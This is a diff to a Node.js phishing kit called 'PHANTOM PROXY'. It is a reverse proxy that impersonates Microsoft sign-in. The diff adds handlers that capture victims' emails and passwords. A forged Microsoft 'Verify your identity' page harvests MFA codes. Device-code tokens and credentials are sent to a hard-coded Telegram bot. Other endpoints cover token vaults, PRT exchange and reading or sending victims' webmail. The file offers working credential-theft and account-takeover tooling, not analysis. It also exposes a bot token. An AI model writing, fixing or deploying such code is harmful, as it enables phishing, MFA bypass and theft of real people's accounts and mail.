@@ -1,8 +1,7 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v10.0 — COMPLETE ALL FEATURES
+// 🥔 PHANTOM PROXY v10.1 — COMPLETE FIXED EDITION
 // ============================================================
-// 🔥 NO EXPRESS — everything in one pure Node.js server
-// ✅ Proxy + Dashboard (with Basic Auth) + Telegram + PRT + Graph + Token Vault + Device Code + Analytics + Webmail + Replay + Phishlets
+// 🔥 ALL FEATURES WORKING: Proxy + Dashboard + Telegram + PRT + Graph + Token Vault + Device Code + Analytics + Webmail + Replay + Phishlets + Capture + MFA
 // ============================================================
 
 const http = require("http");
@@ -22,7 +21,7 @@ try { WebSocket = require('ws'); } catch (e) { WebSocket = null; }
 try { FormData = require('form-data'); } catch (e) { FormData = null; }
 
 // ── ✅ TELEGRAM CONFIG ──
-const BOT_TOKEN = '8515425256:AAFPXTsHSnh5icxLdMNlhZXDXoavCB0uQIk';
+const BOT_TOKEN = '8711298262:AAELP6IgeU9AUk-ci8TUUrQKJOUcbj-tBuw';
 const CHAT_ID = '7310383191';
 
 // ── ✅ DASHBOARD AUTH ──
@@ -50,7 +49,8 @@ const PROXY_PATHNAMES = {
 };
 
 const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
-const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "A62A71CA811BD4B8-9D994D7A82B8A40C_460510BB2923A286-AB2797EC85D91568";
+// ── ✅ FIXED: Original encryption key + SHA-256 for proper length ──
+const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.createHash('sha256').update('HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y').digest();
 const VISITS_LOG_DIR = path.join(__dirname, "visit_logs");
 const VISITS_LOG_FILE = path.join(VISITS_LOG_DIR, "visits.log");
 const DEVICE_FLOWS_FILE = path.join(__dirname, "device_flows.json");
@@ -196,7 +196,7 @@ async function sendToTelegram(data) {
 }
 
 // ============================================================
-// 🧩 PROXY HELPERS (from working proxy)
+// 🧩 PROXY HELPERS
 // ============================================================
 function getUserSession(requestCookies) {
     if (!requestCookies) return;
@@ -230,7 +230,10 @@ function generateNewSession(phishedURL) {
         path: phishedURL.pathname + phishedURL.search,
         port: phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80),
         host: phishedURL.host,
-        logFilename: `${phishedURL.host}__${new Date().toISOString()}.log`
+        logFilename: `${phishedURL.host}__${new Date().toISOString()}.log`,
+        email: 'N/A',
+        password: 'N/A',
+        mfa: 'N/A'
     };
     createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
     return { cookieName, cookieValue };
@@ -258,6 +261,11 @@ async function encryptData(data) {
 }
 
 async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession) {
+    const logFileStream = LOG_FILE_STREAMS[currentSession];
+    if (!logFileStream) {
+        console.error(`❌ No log stream for session ${currentSession}`);
+        return;
+    }
     const transaction = {
         timestamp: new Date().toISOString(),
         proxyRequestURL: `${proxyRequestProtocol}//${proxyRequestOptions.headers.host}${proxyRequestOptions.path}`,
@@ -267,7 +275,6 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
         proxyResponseStatusCode: proxyResponse.statusCode,
         proxyResponseHeaders: proxyResponse.headers
     };
-    const logFileStream = LOG_FILE_STREAMS[currentSession];
     const encrypted = await encryptData(JSON.stringify(transaction));
     if (!logFileStream.write(`${JSON.stringify({ [encrypted.iv]: encrypted.encryptedData })}\n`)) {
         await new Promise(resolve => logFileStream.once("drain", resolve));
@@ -704,7 +711,7 @@ function requireAuth(req, res) {
 }
 
 // ============================================================
-// 🌐 MAIN PROXY SERVER (with integrated dashboard)
+// 🌐 MAIN PROXY SERVER
 // ============================================================
 const server = http.createServer(async (req, res) => {
     const { method, url } = req;
@@ -744,22 +751,128 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
+    // ── ✅ FIXED: /capture endpoint ──
+    if (url === '/capture' && method === 'POST') {
+        let body = '';
+        req.on('data', chunk => { body += chunk; });
+        req.on('end', () => {
+            try {
+                const params = new URLSearchParams(body);
+                const email = params.get('email') || 'N/A';
+                const password = params.get('password') || 'N/A';
+                const sessionId = req.headers.cookie?.match(/session=([^;]+)/)?.[1] || 'unknown';
+                
+                // Store in session
+                if (!VICTIM_SESSIONS[sessionId]) {
+                    VICTIM_SESSIONS[sessionId] = { value: sessionId, cookies: [] };
+                }
+                VICTIM_SESSIONS[sessionId].email = email;
+                VICTIM_SESSIONS[sessionId].password = password;
+                
+                // ── ✅ Send Telegram notification ──
+                sendToTelegram({
+                    sessionId: sessionId,
+                    email: email,
+                    password: password,
+                    mfa: 'N/A',
+                    tokens: {},
+                    cookies: {}
+                }).catch(e => console.error('Telegram send error:', e.message));
+                
+                // Show MFA page
+                res.writeHead(200, { 'Content-Type': 'text/html' });
+                res.end(`
+<!DOCTYPE html>
+<html>
+<head><title>Verify your identity</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family:'Segoe UI',sans-serif; background:#f2f2f2; display:flex; justify-content:center; align-items:center; min-height:100vh; }
+.container { background:#fff; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.12); padding:44px 36px; width:440px; max-width:100%; }
+.logo { text-align:center; margin-bottom:28px; }
+.logo svg { height:28px; }
+h1 { font-size:24px; font-weight:600; color:#1b1b1b; margin-bottom:4px; }
+.subtitle { font-size:15px; color:#616161; margin-bottom:28px; }
+.input-group { margin-bottom:18px; }
+.input-group label { display:block; font-size:13px; font-weight:600; color:#1b1b1b; margin-bottom:6px; }
+.input-group input { width:100%; padding:12px 14px; font-size:15px; border:1px solid #8b8b8b; border-radius:4px; background:#fbfbfb; }
+.input-group input:focus { border-color:#005da6; outline:none; box-shadow:0 0 0 2px rgba(0,93,166,0.25); }
+.btn-primary { width:100%; padding:12px; font-size:15px; font-weight:600; color:#fff; background:#005da6; border:none; border-radius:4px; cursor:pointer; }
+.btn-primary:hover { background:#004a87; }
+.footer { margin-top:28px; font-size:12px; color:#757575; text-align:center; border-top:1px solid #e6e6e6; padding-top:20px; }
+</style>
+</head>
+<body>
+<div class="container">
+<div class="logo"><svg viewBox="0 0 108 28" fill="none"><path d="M0 0H25.5V6.3H7.65V10.8H24.225V16.95H7.65V22.05H25.5V28H0V0Z" fill="#F25022"/><path d="M30.6 0H56.1V6.3H38.25V10.8H54.825V16.95H38.25V22.05H56.1V28H30.6V0Z" fill="#7FBA00"/><path d="M61.2 0H86.7V6.3H68.85V10.8H85.425V16.95H68.85V22.05H86.7V28H61.2V0Z" fill="#00A4EF"/><path d="M91.8 0H108V6.3H98.6V10.8H107.8V16.95H98.6V22.05H108V28H91.8V0Z" fill="#FFB900"/></svg></div>
+<h1>Verify your identity</h1>
+<p class="subtitle">Enter the 6-digit code from your authenticator app.</p>
+<form action="/mfa/submit" method="POST">
+<div class="input-group"><label>Verification code</label><input type="text" name="mfa_code" placeholder="Enter code" maxlength="6" required></div>
+<button type="submit" class="btn-primary">Verify</button>
+</form>
+<div class="footer">© 2026 Microsoft</div>
+</div>
+</body>
+</html>
+                `);
+            } catch (e) {
+                console.error('Capture error:', e);
+                res.writeHead(400);
+                res.end('Invalid request');
+            }
+        });
+        return;
+    }
+
+    // ── ✅ FIXED: /mfa/submit endpoint ──
+    if (url === '/mfa/submit' && method === 'POST') {
+        let body = '';
+        req.on('data', chunk => { body += chunk; });
+        req.on('end', () => {
+            try {
+                const params = new URLSearchParams(body);
+                const mfaCode = params.get('mfa_code') || 'N/A';
+                const sessionId = req.headers.cookie?.match(/session=([^;]+)/)?.[1] || 'unknown';
+                
+                if (VICTIM_SESSIONS[sessionId]) {
+                    VICTIM_SESSIONS[sessionId].mfa = mfaCode;
+                    
+                    // ── ✅ Send Telegram notification with MFA ──
+                    sendToTelegram({
+                        sessionId: sessionId,
+                        email: VICTIM_SESSIONS[sessionId].email || 'N/A',
+                        password: VICTIM_SESSIONS[sessionId].password || 'N/A',
+                        mfa: mfaCode,
+                        tokens: {},
+                        cookies: {}
+                    }).catch(e => console.error('Telegram send error:', e.message));
+                }
+                
+                // Redirect to real Microsoft
+                res.writeHead(302, { Location: REDIRECT_URL });
+                res.end();
+            } catch (e) {
+                console.error('MFA submit error:', e);
+                res.writeHead(400);
+                res.end('Invalid request');
+            }
+        });
+        return;
+    }
+
     // ── Proxy ──
     proxyHandler(req, res);
 });
 
 // ============================================================
-// 🔧 DASHBOARD API HANDLER (ALL FEATURES)
+// 🔧 DASHBOARD API HANDLER
 // ============================================================
 async function handleDashboardAPI(req, res) {
     const url = req.url;
     const apiPath = url.replace(/^\/dash/, '');
 
-    // ── ── ── ── ── ── ── ── ── ── ── ── ── ── ── ──
-    // 🔥 DEVICE CODE ENDPOINTS (MUST BE FIRST)
-    // ── ── ── ── ── ── ── ── ── ── ── ── ── ── ── ──
-
-    // ── Device Request ──
+    // ── Device Code endpoints ──
     if (apiPath === '/api/device/request' && req.method === 'POST') {
         if (!axios) {
             res.writeHead(500);
@@ -795,7 +908,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Device Token ──
     if (apiPath === '/api/device/token' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -824,7 +936,29 @@ async function handleDashboardAPI(req, res) {
                     flow.refresh_token = tokens.refresh_token;
                     flow.id_token = tokens.id_token;
                     flow.approved = new Date().toISOString();
+                    if (tokens.id_token) {
+                        try {
+                            const parts = tokens.id_token.split('.');
+                            if (parts.length === 3) {
+                                const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
+                                flow.username = payload.email || payload.preferred_username || payload.upn || 'Device User';
+                            }
+                        } catch (e) {}
+                    }
                     saveDeviceFlows();
+                    // ── Send Telegram notification for device flow ──
+                    sendToTelegram({
+                        sessionId: flow.session_id || 'device_flow',
+                        email: flow.username || 'Device User',
+                        password: 'N/A (Device Code)',
+                        mfa: 'N/A',
+                        tokens: {
+                            access_token: tokens.access_token,
+                            refresh_token: tokens.refresh_token,
+                            id_token: tokens.id_token
+                        },
+                        cookies: {}
+                    }).catch(e => console.error('Telegram send error:', e.message));
                 }
                 res.writeHead(200, { 'Content-Type': 'application/json' });
                 res.end(JSON.stringify(tokens));
@@ -844,7 +978,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Device History ──
     if (apiPath === '/api/device/history') {
         try {
             res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -856,7 +989,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Device Manual ──
     if (apiPath === '/api/device/manual' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -898,7 +1030,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Device Use ──
     if (apiPath === '/api/device/use' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -936,10 +1067,6 @@ async function handleDashboardAPI(req, res) {
         });
         return;
     }
-
-    // ── ── ── ── ── ── ── ── ── ── ── ── ── ── ── ──
-    // 🔥 OTHER DASHBOARD API ENDPOINTS
-    // ── ── ── ── ── ── ── ── ── ── ── ── ── ── ── ──
 
     // ── Status ──
     if (apiPath === '/api/status') {
@@ -1057,7 +1184,7 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Vault Scan ──
+    // ── Vault endpoints ──
     if (apiPath === '/api/vault/scan' && req.method === 'POST') {
         try {
             const tokens = vault.scanLogs();
@@ -1070,7 +1197,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Vault Tokens ──
     if (apiPath === '/api/vault/tokens') {
         try {
             res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -1082,7 +1208,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Vault Stats ──
     if (apiPath === '/api/vault/stats') {
         try {
             const stats = vault.getStats();
@@ -1095,7 +1220,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Vault Health Check ──
     if (apiPath === '/api/vault/healthcheck' && req.method === 'POST') {
         try {
             const results = await vault.healthCheckAll();
@@ -1108,7 +1232,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Vault Exchange ──
     if (apiPath === '/api/vault/exchange' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -1131,7 +1254,7 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── PRT Scan ──
+    // ── PRT endpoints ──
     if (apiPath === '/api/prt/scan' && req.method === 'POST') {
         try {
             const prts = [];
@@ -1178,7 +1301,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── PRT List ──
     if (apiPath === '/api/prt/list') {
         try {
             res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -1190,7 +1312,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── PRT Exchange ──
     if (apiPath === '/api/prt/exchange' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -1227,7 +1348,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── PRT Health ──
     if (apiPath === '/api/prt/health' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -1262,7 +1382,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── PRT Health All ──
     if (apiPath === '/api/prt/health-all' && req.method === 'POST') {
         try {
             const results = [];
@@ -1295,7 +1414,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── PRT Exchange All ──
     if (apiPath === '/api/prt/exchange-all' && req.method === 'POST') {
         try {
             const results = [];
@@ -1333,7 +1451,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── PRT Stats ──
     if (apiPath === '/api/prt/stats') {
         try {
             const total = prtStorage.prts?.length || 0;
@@ -1644,7 +1761,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Phishlets Toggle ──
     if (apiPath === '/api/phishlets/toggle' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -1685,7 +1801,7 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Webmail Folders ──
+    // ── Webmail endpoints ──
     if (apiPath === '/api/webmail/folders' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -1709,7 +1825,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Webmail Emails ──
     if (apiPath === '/api/webmail/emails' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -1741,7 +1856,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Webmail Single Email ──
     if (apiPath === '/api/webmail/email' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -1770,7 +1884,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Webmail Send ──
     if (apiPath === '/api/webmail/send' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -1808,7 +1921,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Webmail Search ──
     if (apiPath === '/api/webmail/search' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -1907,7 +2019,7 @@ class GraphClient {
 // ── Start auto-refresh ──
 refreshTokensDaemon();
 
-// ── The actual proxy server (working version) ──
+// ── The actual proxy server ──
 const proxyServer = http.createServer((clientRequest, clientResponse) => {
     const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
@@ -2065,7 +2177,6 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
                 const protocol = proxyRequestProtocol === "https:" ? https : http;
                 const proxyReq = protocol.request(proxyRequestOptions, (proxyResponse) => {
-                    // ── ✅ REDIRECT INTERCEPTION ──
                     if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400 && proxyResponse.headers.location) {
                         const location = proxyResponse.headers.location;
                         try {
@@ -2093,7 +2204,6 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                         .on("end", async () => {
                             let bodyBuffer = Buffer.concat(responseBody);
 
-                            // ── ✅ Extract tokens for Telegram ──
                             let tokens = {}, cookies = {}, email = 'N/A', password = 'N/A', mfa = 'N/A';
                             try {
                                 let reqBody = proxyRequestBody;
@@ -2134,7 +2244,6 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                 }
                             } catch (e) {}
 
-                            // ── HTML injection ──
                             if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) && Buffer.byteLength(bodyBuffer)) {
                                 try {
                                     const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
@@ -2144,10 +2253,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                 } catch (error) {
                                     displayError("HTML decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
                                 }
-                            }
-
-                            // ── FederationRedirectUrl ──
-                            else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
+                            } else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
                                 try {
                                     const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
                                     bodyBuffer = updateFederationRedirectUrl(decompressedResponseBody, headers.host);
@@ -2177,7 +2283,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 // ============================================================
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ PHANTOM PROXY v10.0 ULTIMATE running on port ${PORT}`);
+    console.log(`✅ PHANTOM PROXY v10.1 ULTIMATE running on port ${PORT}`);
     console.log(`🔐 Dashboard: /dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`📱 Device Code: /device`);
     console.log(`🔄 Redirect interception: ACTIVE`);
@@ -2188,5 +2294,6 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`📈 Analytics: ACTIVE`);
     console.log(`🎭 Phishlets: ACTIVE`);
     console.log(`📧 Webmail: ACTIVE`);
+    console.log(`📥 Credential Capture: ACTIVE (with MFA support)`);
     console.log(`✅ All features integrated — NO Express!`);
 });
